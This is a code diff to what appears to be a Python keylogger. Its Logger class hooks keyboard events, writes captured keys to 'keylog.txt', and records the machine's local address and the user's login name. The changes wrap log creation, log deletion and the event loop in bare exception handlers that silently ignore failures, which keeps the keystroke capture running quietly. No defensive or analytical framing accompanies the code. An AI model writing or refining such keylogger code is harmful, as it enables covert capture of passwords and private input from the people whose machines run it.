@@ -19,6 +19,9 @@ class Logger:
 
     def __init__(self, path, name='keylog.txt'):
 
+        # Initializes the pygame module
+        pygame.init()
+
         # Sets the path of the log file
         self.path = path + name
 
@@ -32,10 +35,13 @@ class Logger:
         t.start()
 
     def mk_log(self):
-        self.log = open(self.path, 'w')
-        header = "-=[" + get_local_addr() + " " + os.getlogin() + " " + time.strftime("%d/%m/%Y %H:%M:%S") + "]=-\n"
-        divider = "______________________________________________________\n\n"
-        general.append_to_file(self.path, header + divider)
+        try:
+            self.log = open(self.path, 'w')
+            header = "-=[" + get_local_addr() + " " + os.getlogin() + " " + time.strftime("%d/%m/%Y %H:%M:%S") + "]=-\n"
+            divider = "______________________________________________________\n\n"
+            general.append_to_file(self.path, header + divider)
+        except:
+            pass
 
     def start(self):
 
@@ -44,10 +50,13 @@ class Logger:
         self.hook.KeyDown = self.on_keyboard_event
         self.hook.HookKeyboard()
 
-        # Starts the event pump
-        pygame.init()
-        while True:
-            pygame.event.pump()
+        try:
+            # Starts the event pump
+            while True:
+                pygame.event.pump()
+        except:
+            while True:
+                pygame.event.pump()
 
     def pause(self):
         self.paused = True
@@ -58,8 +67,11 @@ class Logger:
         self.buffer = ''
 
     def del_log(self):
-        os.remove(self.path)
-        self.mk_log()
+        try:
+            os.remove(self.path)
+            self.mk_log()
+        except:
+            pass
 
     def on_keyboard_event(self, event):
 
